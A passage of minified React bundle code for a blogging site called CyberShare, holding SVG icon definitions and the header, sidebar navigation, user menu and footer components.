n=j.forwardRef(({color:r="currentColor",size:a=24,strokeWidth:l=2,absoluteStrokeWidth:u,children:f,...h},m)=>j.createElement("svg",{ref:m,...a_,width:a,height:a,stroke:r,strokeWidth:u?Number(l)*24/Number(a):l,className:`lucide lucide-${s_(e)}`,...h},[...t.map(([x,g])=>j.createElement(x,g)),...(Array.isArray(f)?f:[f])||[]]));return n.displayName=`${e}`,n},Xu=He("AlertCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]]),Fi=He("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]),tb=He("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]),xk=He("ArrowUpRight",[["path",{d:"M7 7h10v10",key:"1tivn9"}],["path",{d:"M7 17 17 7",key:"1vkiza"}]]),l_=He("Ban",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m4.9 4.9 14.2 14.2",key:"1m5liu"}]]),yk=He("BarChart3",[["path",{d:"M3 3v18h18",key:"1s2lah"}],["path",{d:"M18 17V9",key:"2bz60n"}],["path",{d:"M13 17V5",key:"1frdt8"}],["path",{d:"M8 17v-3",key:"17ska0"}]]),qg=He("Bell",[["path",{d:"M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9",key:"1qo2s2"}],["path",{d:"M10.3 21a1.94 1.94 0 0 0 3.4 0",key:"qgo35s"}]]),_u=He("Bookmark",[["path",{d:"m19 21-7-4-7 4V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v16z",key:"1fy3hk"}]]),em=He("Bot",[["path",{d:"M12 8V4H8",key:"hb8ula"}],["rect",{width:"16",height:"12",x:"4",y:"8",rx:"2",key:"enze0r"}],["path",{d:"M2 14h2",key:"vft8re"}],["path",{d:"M20 14h2",key:"4cs60a"}],["path",{d:"M15 13v2",key:"1xurst"}],["path",{d:"M9 13v2",key:"rq6x2g"}]]),Zu=He("Calendar",[["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",ry:"2",key:"eu3xkr"}],["line",{x1:"16",x2:"16",y1:"2",y2:"6",key:"m3sa8f"}],["line",{x1:"8",x2:"8",y1:"2",y2:"6",key:"18kwsl"}],["line",{x1:"3",x2:"21",y1:"10",y2:"10",key:"xt86sb"}]]),Iu=He("CheckCircle",[["path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14",key:"g774vq"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]]),o_=He("Check",[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]]),u_=He("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]]),$g=He("ChevronLeft",[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]]),Pu=He("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]),Yg=He("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]),c_=He("Compass",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polygon",{points:"16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76",key:"m9r19z"}]]),d_=He("Database",[["ellipse",{cx:"12",cy:"5",rx:"9",ry:"3",key:"msslwz"}],["path",{d:"M3 5V19A9 3 0 0 0 21 19V5",key:"1wlel7"}],["path",{d:"M3 12A9 3 0 0 0 21 12",key:"mv7ke4"}]]),f_=He("Download",[["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["polyline",{points:"7 10 12 15 17 10",key:"2ggqvy"}],["line",{x1:"12",x2:"12",y1:"15",y2:"3",key:"1vk2je"}]]),gl=He("EyeOff",[["path",{d:"M9.88 9.88a3 3 0 1 0 4.24 4.24",key:"1jxqfv"}],["path",{d:"M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68",key:"9wicm4"}],["path",{d:"M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61",key:"1jreej"}],["line",{x1:"2",x2:"22",y1:"2",y2:"22",key:"a6p6uj"}]]),kn=He("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]),h_=He("FileEdit",[["path",{d:"M4 13.5V4a2 2 0 0 1 2-2h8.5L20 7.5V20a2 2 0 0 1-2 2h-5.5",key:"1bg6eb"}],["polyline",{points:"14 2 14 8 20 8",key:"1ew0cm"}],["path",{d:"M10.42 12.61a2.1 2.1 0 1 1 2.97 2.97L7.95 21 4 22l.99-3.95 5.43-5.44Z",key:"1rgxu8"}]]),Xr=He("FileText",[["path",{d:"M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z",key:"1nnpy2"}],["polyline",{points:"14 2 14 8 20 8",key:"1ew0cm"}],["line",{x1:"16",x2:"8",y1:"13",y2:"13",key:"14keom"}],["line",{x1:"16",x2:"8",y1:"17",y2:"17",key:"17nazh"}],["line",{x1:"10",x2:"8",y1:"9",y2:"9",key:"1a5vjj"}]]),vk=He("Filter",[["polygon",{points:"22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3",key:"1yg77f"}]]),x0=He("Flame",[["path",{d:"M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z",key:"96xj49"}]]),y0=He("FolderTree",[["path",{d:"M20 10a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1h-2.5a1 1 0 0 1-.8-.4l-.9-1.2A1 1 0 0 0 15 3h-2a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"hod4my"}],["path",{d:"M20 21a1 1 0 0 0 1-1v-3a1 1 0 0 0-1-1h-2.9a1 1 0 0 1-.88-.55l-.42-.85a1 1 0 0 0-.92-.6H13a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"w4yl2u"}],["path",{d:"M3 5a2 2 0 0 0 2 2h3",key:"f2jnh7"}],["path",{d:"M3 3v13a2 2 0 0 0 2 2h3",key:"k8epm1"}]]),xl=He("Folder",[["path",{d:"M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z",key:"1kt360"}]]),p_=He("Globe",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",key:"13o1zl"}],["path",{d:"M2 12h20",key:"9i4pu4"}]]),cr=He("Heart",[["path",{d:"M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",key:"c3ymky"}]]),v0=He("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]),Vg=He("Image",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]]),m_=He("Info",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 16v-4",key:"1dtifu"}],["path",{d:"M12 8h.01",key:"e9boi3"}]]),g_=He("Key",[["circle",{cx:"7.5",cy:"15.5",r:"5.5",key:"yqb3hr"}],["path",{d:"m21 2-9.6 9.6",key:"1j0ho8"}],["path",{d:"m15.5 7.5 3 3L22 7l-3-3",key:"1rn1fs"}]]),x_=He("LayoutDashboard",[["rect",{width:"7",height:"9",x:"3",y:"3",rx:"1",key:"10lvy0"}],["rect",{width:"7",height:"5",x:"14",y:"3",rx:"1",key:"16une8"}],["rect",{width:"7",height:"9",x:"14",y:"12",rx:"1",key:"1hutg5"}],["rect",{width:"7",height:"5",x:"3",y:"16",rx:"1",key:"ldoo1y"}]]),b0=He("Loader2",[["path",{d:"M21 12a9 9 0 1 1-6.219-8.56",key:"13zald"}]]),ga=He("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]),bk=He("LogOut",[["path",{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4",key:"1uf3rs"}],["polyline",{points:"16 17 21 12 16 7",key:"1gabdz"}],["line",{x1:"21",x2:"9",y1:"12",y2:"12",key:"1uyos4"}]]),Nl=He("Mail",[["rect",{width:"20",height:"16",x:"2",y:"4",rx:"2",key:"18n3k1"}],["path",{d:"m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7",key:"1ocrg3"}]]),y_=He("Maximize2",[["polyline",{points:"15 3 21 3 21 9",key:"mznyad"}],["polyline",{points:"9 21 3 21 3 15",key:"1avn1i"}],["line",{x1:"21",x2:"14",y1:"3",y2:"10",key:"ota7mn"}],["line",{x1:"3",x2:"10",y1:"21",y2:"14",key:"1atl0r"}]]),Ek=He("Menu",[["line",{x1:"4",x2:"20",y1:"12",y2:"12",key:"1e0a9i"}],["line",{x1:"4",x2:"20",y1:"6",y2:"6",key:"1owob3"}],["line",{x1:"4",x2:"20",y1:"18",y2:"18",key:"yk5zj1"}]]),Ju=He("MessageCircle",[["path",{d:"m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z",key:"v2veuj"}]]),cf=He("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]),v_=He("Minimize2",[["polyline",{points:"4 14 10 14 10 20",key:"11kfnr"}],["polyline",{points:"20 10 14 10 14 4",key:"rlmsce"}],["line",{x1:"14",x2:"21",y1:"10",y2:"3",key:"o5lafz"}],["line",{x1:"3",x2:"10",y1:"21",y2:"14",key:"1atl0r"}]]),b_=He("MoreHorizontal",[["circle",{cx:"12",cy:"12",r:"1",key:"41hilf"}],["circle",{cx:"19",cy:"12",r:"1",key:"1wjl8i"}],["circle",{cx:"5",cy:"12",r:"1",key:"1pcz8c"}]]),E_=He("MoreVertical",[["circle",{cx:"12",cy:"12",r:"1",key:"41hilf"}],["circle",{cx:"12",cy:"5",r:"1",key:"gxeob9"}],["circle",{cx:"12",cy:"19",r:"1",key:"lyex9k"}]]),xa=He("PenSquare",[["path",{d:"M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7",key:"1qinfi"}],["path",{d:"M18.5 2.5a2.12 2.12 0 0 1 3 3L12 15l-4 1 1-4Z",key:"w2jsv5"}]]),Gg=He("Pen",[["path",{d:"M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z",key:"5qss01"}]]),df=He("Plus",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]]),Xn=He("RefreshCw",[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]]),Bl=He("Save",[["path",{d:"M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z",key:"1owoqh"}],["polyline",{points:"17 21 17 13 7 13 7 21",key:"1md35c"}],["polyline",{points:"7 3 7 8 15 8",key:"8nz8an"}]]),Al=He("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]),Qg=He("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]),ec=He("Settings",[["path",{d:"M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",key:"1qme2f"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]),w_=He("ShieldOff",[["path",{d:"M19.7 14a6.9 6.9 0 0 0 .3-2V5l-8-3-3.2 1.2",key:"342pvf"}],["path",{d:"m2 2 20 20",key:"1ooewy"}],["path",{d:"M4.7 4.7 4 5v7c0 6 8 10 8 10a20.3 20.3 0 0 0 5.62-4.38",key:"p0ycf4"}]]),Da=He("Shield",[["path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10",key:"1irkt0"}]]),k_=He("Sparkles",[["path",{d:"m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z",key:"17u4zn"}],["path",{d:"M5 3v4",key:"bklmnn"}],["path",{d:"M19 17v4",key:"iiml17"}],["path",{d:"M3 5h4",key:"nem4j1"}],["path",{d:"M17 19h4",key:"lbex7p"}]]),E0=He("Tag",[["path",{d:"M12 2H2v10l9.29 9.29c.94.94 2.48.94 3.42 0l6.58-6.58c.94-.94.94-2.48 0-3.42L12 2Z",key:"14b2ls"}],["path",{d:"M7 7h.01",key:"7u93v4"}]]),wk=He("Tags",[["path",{d:"M9 5H2v7l6.29 6.29c.94.94 2.48.94 3.42 0l3.58-3.58c.94-.94.94-2.48 0-3.42L9 5Z",key:"gt587u"}],["path",{d:"M6 9.01V9",key:"1flxpt"}],["path",{d:"m15 5 6.3 6.3a2.4 2.4 0 0 1 0 3.4L17 19",key:"1cbfv1"}]]),Dl=He("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]),ju=He("TrendingUp",[["polyline",{points:"22 7 13.5 15.5 8.5 10.5 2 17",key:"126l90"}],["polyline",{points:"16 7 22 7 22 13",key:"kwv8wd"}]]),Kg=He("Upload",[["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["polyline",{points:"17 8 12 3 7 8",key:"t8dd8p"}],["line",{x1:"12",x2:"12",y1:"3",y2:"15",key:"widbto"}]]),T_=He("UserMinus",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["line",{x1:"22",x2:"16",y1:"11",y2:"11",key:"1shjgl"}]]),Xg=He("UserPlus",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["line",{x1:"19",x2:"19",y1:"8",y2:"14",key:"1bvyxn"}],["line",{x1:"22",x2:"16",y1:"11",y2:"11",key:"1shjgl"}]]),ff=He("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]),Mi=He("Users",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["path",{d:"M16 3.13a4 4 0 0 1 0 7.75",key:"1da9ce"}]]),C_=He("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]),Bi=He("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]);function S_(){var N,T,A,_,M,R,B,U;const{user:e,isAuthenticated:t,logout:n,loading:r}=Gt(),{sidebarOpen:a,setSidebarOpen:l}=rk(),u=Ln(),f=Or(),[h,m]=j.useState(0),[x,g]=j.useState(""),[b,E]=j.useState(!1);j.useEffect(()=>{window.innerWidth<768&&l(!1)},[f.pathname]),j.useEffect(()=>{if(t){C();const $=setInterval(C,3e4);return()=>clearInterval($)}},[t,f.pathname]);const C=async()=>{try{const $=await _e.get("/api/notifications/unread-count");m($.data.count)}catch($){console.error("Failed to fetch unread count:",$)}},P=async()=>{await n(),u("/"),l(!1)},O=$=>{$.preventDefault(),x.trim()&&(u(`/explore?q=${encodeURIComponent(x.trim())}`),g(""))};return r?o.jsx("header",{className:"border-b",children:o.jsx("div",{className:"container mx-auto px-4 py-4",children:o.jsxs("div",{className:"flex items-center justify-between",children:[o.jsx(we,{to:"/",className:"flex items-center",children:o.jsx("span",{className:"text-2xl font-bold text-primary",style:{fontFamily:"Times New Roman, Times, serif"},children:"CyberShare"})}),o.jsx("div",{className:"h-8 w-8 animate-pulse bg-gray-200 rounded-full"})]})})}):o.jsxs(o.Fragment,{children:[a&&o.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 z-40 md:hidden",onClick:()=>l(!1)}),b&&o.jsx("div",{className:"fixed inset-0 bg-white z-50 md:hidden",children:o.jsxs("div",{className:"flex items-center gap-2 p-3 border-b",children:[o.jsx("button",{onClick:()=>E(!1),className:"p-2 hover:bg-gray-100 rounded-full",children:o.jsx($g,{className:"h-6 w-6"})}),o.jsx("form",{onSubmit:$=>{O($),E(!1)},className:"flex-1",children:o.jsx("input",{type:"text",value:x,onChange:$=>g($.target.value),placeholder:"Search...",autoFocus:!0,className:"w-full px-4 py-2 border border-gray-200 rounded-full focus:outline-none focus:border-blue-500 bg-gray-50"})})]})}),o.jsx("header",{className:"border-b bg-white sticky top-0 z-50",children:o.jsx("div",{className:"w-full px-6 py-3",children:o.jsxs("div",{className:"flex items-center justify-between gap-4",children:[o.jsxs("div",{className:"flex items-center gap-3",children:[o.jsx("button",{onClick:()=>l(!a),className:"p-2 hover:bg-gray-100 rounded-full transition-colors","aria-label":"Menu",children:o.jsx(Ek,{className:"h-6 w-6"})}),o.jsx(we,{to:"/",className:"flex items-center",children:o.jsx("span",{className:"text-2xl font-bold text-primary",style:{fontFamily:"Times New Roman, Times, serif"},children:"CyberShare"})})]}),o.jsxs("div",{className:"hidden md:flex items-center gap-2 flex-1 max-w-2xl mx-auto",children:[o.jsx("form",{onSubmit:O,className:"flex-1",children:o.jsxs("div",{className:"relative",children:[o.jsx(Al,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-gray-400"}),o.jsx("input",{type:"text",value:x,onChange:$=>g($.target.value),placeholder:"Search",className:"w-full pl-10 pr-4 py-2 border border-gray-200 rounded-full focus:outline-none focus:border-gray-400 bg-gray-50 text-sm"})]})}),o.jsx("button",{className:"p-2 hover:bg-gray-100 rounded-full transition-colors text-gray-600 hover:text-gray-900","aria-label":"AI Chat",title:"Chat with AI",children:o.jsx(Ju,{className:"h-5 w-5"})})]}),o.jsxs("div",{className:"flex items-center gap-1 sm:gap-2",children:[o.jsx("button",{onClick:()=>E(!0),className:"p-2 hover:bg-gray-100 rounded-full md:hidden","aria-label":"Search",children:o.jsx(Al,{className:"h-5 w-5 text-gray-600"})}),t?o.jsxs(o.Fragment,{children:[o.jsx(we,{to:"/write",children:o.jsxs(Ee,{variant:"ghost",size:"sm",className:"gap-2 text-gray-600 hover:text-gray-900",children:[o.jsx(xa,{className:"h-5 w-5"}),o.jsx("span",{className:"hidden md:inline",children:"Write"})]})}),o.jsx(we,{to:"/notifications",children:o.jsxs(Ee,{variant:"ghost",size:"icon",className:"relative",children:[o.jsx(qg,{className:"h-6 w-6 text-gray-600"}),h>0&&o.jsx("span",{className:"absolute top-0 right-0 h-5 w-5 bg-red-500 rounded-full text-[10px] text-white flex items-center justify-center font-medium",children:h>9?"9+":h})]})}),o.jsxs("div",{className:"relative group",children:[o.jsx("button",{className:"flex items-center",children:e!=null&&e.avatarUrl?o.jsxs(o.Fragment,{children:[o.jsx("img",{src:e.avatarUrl,alt:`${e.displayName||e.username||"User"} avatar`,className:"h-8 w-8 rounded-full object-cover",onError:$=>{$.currentTarget.style.display="none",$.currentTarget.nextSibling&&($.currentTarget.nextSibling.style.display="flex")}}),o.jsx("div",{className:"h-8 w-8 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center text-white font-semibold text-sm",style:{display:"none"},children:((T=(N=e==null?void 0:e.displayName)==null?void 0:N[0])==null?void 0:T.toUpperCase())||((_=(A=e==null?void 0:e.username)==null?void 0:A[0])==null?void 0:_.toUpperCase())||"U"})]}):o.jsx("div",{className:"h-8 w-8 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center text-white font-semibold text-sm",children:((R=(M=e==null?void 0:e.displayName)==null?void 0:M[0])==null?void 0:R.toUpperCase())||((U=(B=e==null?void 0:e.username)==null?void 0:B[0])==null?void 0:U.toUpperCase())||"U"})}),o.jsxs("div",{className:"absolute right-0 mt-2 w-56 bg-white rounded-lg shadow-xl py-2 border opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200",children:[o.jsxs("div",{className:"px-4 py-3 border-b",children:[o.jsx("p",{className:"text-sm font-semibold truncate",children:(e==null?void 0:e.displayName)||(e==null?void 0:e.username)}),o.jsx("p",{className:"text-xs text-gray-500 truncate",children:e==null?void 0:e.email})]}),o.jsx(we,{to:"/profile",className:"block px-4 py-2 text-sm hover:bg-gray-50 transition-colors",children:"Profile"}),o.jsx(we,{to:"/dashboard",className:"block px-4 py-2 text-sm hover:bg-gray-50 transition-colors",children:"My Posts"}),o.jsx(we,{to:"/bookmarks",className:"block px-4 py-2 text-sm hover:bg-gray-50 transition-colors",children:"Bookmarks"}),o.jsx(we,{to:"/settings",className:"block px-4 py-2 text-sm hover:bg-gray-50 transition-colors",children:"Settings"}),(e==null?void 0:e.role)==="ADMIN"&&o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"border-t my-1"}),o.jsxs(we,{to:"/admin",className:"block px-4 py-2 text-sm hover:bg-gray-50 transition-colors text-purple-600 flex items-center gap-2",children:[o.jsx(Da,{className:"h-4 w-4"}),"Admin Dashboard"]})]}),o.jsx("div",{className:"border-t my-1"}),o.jsxs("button",{onClick:P,className:"w-full text-left px-4 py-2 text-sm hover:bg-gray-50 flex items-center gap-2 text-red-600 transition-colors",children:[o.jsx(bk,{className:"h-4 w-4"}),"Sign out"]})]})]})]}):o.jsxs(o.Fragment,{children:[o.jsx(Ee,{variant:"ghost",size:"sm",asChild:!0,children:o.jsx(we,{to:"/login",children:"Sign In"})}),o.jsx(Ee,{size:"sm",asChild:!0,children:o.jsx(we,{to:"/register",children:"Get Started"})})]})]})]})})}),o.jsx("aside",{className:`fixed top-[57px] left-0 h-[calc(100vh-57px)] w-64 bg-white border-r z-40 transition-transform duration-300 ease-in-out ${a?"translate-x-0":"-translate-x-64"}`,children:o.jsxs("nav",{className:"p-4 space-y-1",children:[o.jsxs(we,{to:"/",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(v0,{className:"h-5 w-5"}),o.jsx("span",{children:"Home"})]}),o.jsxs(we,{to:"/explore",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/explore"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(c_,{className:"h-5 w-5"}),o.jsx("span",{children:"Explore"})]}),o.jsxs(we,{to:"/trending",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/trending"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(yk,{className:"h-5 w-5"}),o.jsx("span",{children:"Trending"})]}),t&&o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"pt-4 border-t mt-4",children:o.jsx("p",{className:"px-3 py-2 text-xs font-semibold text-gray-500 uppercase tracking-wider",children:"Personal"})}),o.jsxs(we,{to:"/feed",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/feed"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(Mi,{className:"h-5 w-5"}),o.jsx("span",{children:"Following"})]}),o.jsxs(we,{to:"/bookmarks",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/bookmarks"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(_u,{className:"h-5 w-5"}),o.jsx("span",{children:"Bookmarks"})]}),o.jsxs(we,{to:"/dashboard",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/dashboard"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(Xr,{className:"h-5 w-5"}),o.jsx("span",{children:"My Posts"})]}),o.jsxs(we,{to:"/profile",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/profile"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx("svg",{className:"h-5 w-5",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:o.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"})}),o.jsx("span",{children:"Profile"})]}),o.jsxs(we,{to:"/settings",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/settings"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(ec,{className:"h-5 w-5"}),o.jsx("span",{children:"Settings"})]}),(e==null?void 0:e.role)==="ADMIN"&&o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"pt-4 border-t mt-4",children:o.jsx("p",{className:"px-3 py-2 text-xs font-semibold text-gray-500 uppercase tracking-wider",children:"Admin"})}),o.jsxs(we,{to:"/admin",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname.startsWith("/admin")?"bg-purple-100 font-medium text-purple-700":"text-purple-600"}`,children:[o.jsx(Da,{className:"h-5 w-5"}),o.jsx("span",{children:"Admin Dashboard"})]})]})]}),o.jsx("div",{className:"pt-4 border-t mt-4",children:o.jsxs(we,{to:"/about",className:`flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-gray-100 transition-colors ${f.pathname==="/about"?"bg-gray-100 font-medium":"text-gray-700"}`,children:[o.jsx(m_,{className:"h-5 w-5"}),o.jsx("span",{children:"About"})]})})]})})]})}function N_(){return o.jsx("footer",{className:"border-t mt-auto",children:o.jsx("div",{className:"container mx-auto px-4 py-6",children:o.jsxs("div",{className:"flex flex-col md:flex-row justify-between items-center",children:[o.jsx("p",{className:"text-sm text-muted-foreground",children:" 2025 CyberShare. All rights reserved."}),o.jsxs("div",{className:"flex space-x-6 mt-4 md:mt-0",children:[o.jsx("a",{href:"#",className:"text-sm text-muted-foreground hover:text-primary transition-colors",children:"Privacy"}),o.jsx("a",{href:"#",className:"text-sm text-muted-foreground hover:text-primary transition-colors",children:"Terms"}),o.jsx("a",{href:"#",className:"text-sm text-muted-foreground hover:text-primary transition-colors",children:"Contact"})]})]})})})}function A_(){const{sidebarOpen:e}=rk();return 